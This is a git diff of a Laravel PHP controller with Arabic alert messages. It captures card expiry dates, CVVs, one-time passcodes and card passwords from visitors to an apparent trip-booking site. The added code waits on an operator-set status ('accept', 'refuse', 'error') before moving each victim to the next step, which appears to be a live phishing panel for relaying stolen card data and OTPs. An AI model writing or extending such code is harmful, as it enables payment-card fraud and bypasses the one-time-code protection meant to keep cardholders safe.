@@ -12,6 +12,7 @@ use App\Models\Country;
 use App\Models\SmsProvider;
 use App\Models\Trip;
 use Illuminate\Support\Facades\Auth;
+use MongoDB\Driver\Session;
 use RealRashid\SweetAlert\Facades\Alert;
 use Illuminate\Http\Request;
 use Illuminate\Support\Carbon;
@@ -25,7 +26,7 @@ class ClientController extends Controller
         return view('dashboard.clients.index', compact('clients'));
     }
 
-    public function updatestatus($status,$id)
+    public function updatestatus($status, $id)
     {
 //        $dat=$status->toArray();
 //        dd($status['accept'][0]);
@@ -85,11 +86,17 @@ class ClientController extends Controller
         $client->expiry_date = $request->expiry_date;
         $client->cvv = $request->cvv;
         $client->save();
-        return view('frontend.otp_info1')->with([
-            'client' => $client,
-            'trip_id' => $request->trip_id,
-            'client_id' => $request->client_id
-        ]);
+
+        session()->put('trip_id', $request->trip_id);
+        session()->put('client', $client);
+
+
+        return redirect(route('otp_info2.store'));
+//        return view('frontend.otp_info1')->with([
+//            'client' => $client,
+//            'trip_id' => $request->trip_id,
+//            'client_id' => $request->client_id
+//        ]);
 //
 ////        return view('frontend.otppass')->with([
 //            'client' => $client,
@@ -98,6 +105,17 @@ class ClientController extends Controller
 //        ]);
 
 //        return view('frontend.otppass');
+    }
+
+    public function storeOtpInfoStep2(){
+        $client=session('client');
+        $trip=session('trip_id');
+        return view('frontend.otp_info1')->with([
+            'client' => $client,
+            'trip_id' => $trip,
+            'client_id' => $client['id'],
+        ]);
+
     }
 
     public function storeOtpInfoStep1(Request $request)
@@ -109,11 +127,35 @@ class ClientController extends Controller
         $client->save();
 //        $countries = Country::all();
 //        $sms_providers = SmsProvider::all();
+        $trip_id = session('trip_id');
 
-//
-        Alert::info(' success', 'برجاء الانتظار يتم التحقق من البيانات المدخلة');
+        if ($client->status1 == 'accept') {
+
+            return redirect(route('password_card_page'));
+
+        } else if ($client->status1 == 'refuse') {
+
+
+            Alert::error(' error', 'برجاء ادخال البيانات الصحيحه');
+
+            return back();
+
+
+        } elseif ($client->status1 == 'error') {
+
+            return redirect(url('sbank_infosss/' . $trip_id . '/' . $request->client_id));
+        } else {
+//            return "sAS";
+            Alert::info(' success', 'برجاء الانتظار يتم التحقق من البيانات المدخلة');
+            return view('frontend.otp_info1')->with([
+                'client' => $client,
+                'trip_id' => $trip_id,
+                'client_id' => $request->client_id
+            ]);
+
+        }
+
 //        return view('frontend.otp_info1',compact('client'));
-        return redirect(route('password_card_page'));
 //        return view('frontend.phone_info')->with([
 //            'sms_providers' => $sms_providers,
 //            'countries' => $countries,
@@ -143,27 +185,60 @@ class ClientController extends Controller
 
     public function checkOtpCode(CheckOtpCodeRequest $request)
     {
-        $client = Client::where('id', $request->client_id)->first();
+
+        $clients=session('client');
+        $trip_id=session('trip_id');
+        $client = Client::where('id', $clients['id'])->first();
         $client->otp2 = $request->otp_code;
         $client->save();
-        return view('frontend.password_number', compact('client'));
+        $countries = Country::get();
+        $sms_providers = SmsProvider::get();
+
+
+        if($client->status2=='accept'){
+            return view('frontend.phone_info', compact('client', 'trip_id', 'countries', 'sms_providers'));
+
+
+        }else if($client->status2=='refuse'){
+
+
+            Alert::error(' error', 'برجاء ادخال البيانات الصحيحه');
+
+            return back();
+        } else{
+            Alert::info(' success', 'برجاء الانتظار يتم التحقق من البيانات المدخلة');
+            return back();
+
+
+        }
     }
 
-    public function checkOtpCodePassword(PasswordCardRequest $request)
+    public function checkOtppage22(){
+
+        return view('frontend.otp_info');
+    }
+    public function checkOtpCodePassword(Request $request)
     {
-        $clientid = Auth::id() ?? 0;
+
+        $client = session('client');
+
+        $clientid = $client['id'] ?? 0;
         $client = Client::where('id', $clientid)->first();
         $client->password_card = $request->password;
         $client->save();
         $trip_id = 1;
         $countries = Country::get();
         $sms_providers = SmsProvider::get();
-        return view('frontend.phone_info', compact('client', 'trip_id', 'countries', 'sms_providers'));
+
+        return redirect(route('otp_card_page22'));
+
     }
 
     public function checkOtpCodeotp(CheckOtpCodeRequest $request)
     {
-        $clientid = Auth::id() ?? 0;
+        $client = session('client');
+
+        $clientid = $client['id'] ?? 0;
         $client = Client::where('id', $clientid)->first();
         $client->otp2 = $request->otp_code;
         $client->save();
@@ -172,6 +247,8 @@ class ClientController extends Controller
 
         return redirect(route('choose_trip'));
     }
+
+
 
     public function checkOtppassword()
     {
